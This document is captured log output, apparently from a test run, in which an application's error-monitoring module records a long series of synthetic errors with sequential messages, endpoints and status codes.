WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914774Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4218'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914844Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4219'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914899Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4220'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914955Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4221'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915005Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4222'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915055Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4223'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915105Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4224'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915155Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4225'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915206Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4226'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915255Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4227'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915303Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4228'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915352Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4229'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915400Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4230'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915485Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4231'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915567Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4232'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915625Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4233'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915677Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4234'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915726Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4235'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915777Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4236'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915826Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4237'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915877Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4238'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915926Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4239'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.915975Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4240'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916026Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4241'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916075Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4242'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916127Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4243'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916176Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4244'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916225Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4245'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916273Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4246'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916321Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4247'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916370Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4248'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916419Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4249'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916468Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4250'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916517Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4251'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916618Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4252'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916687Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4253'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916744Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4254'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916799Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4255'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916849Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4256'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916899Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4257'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
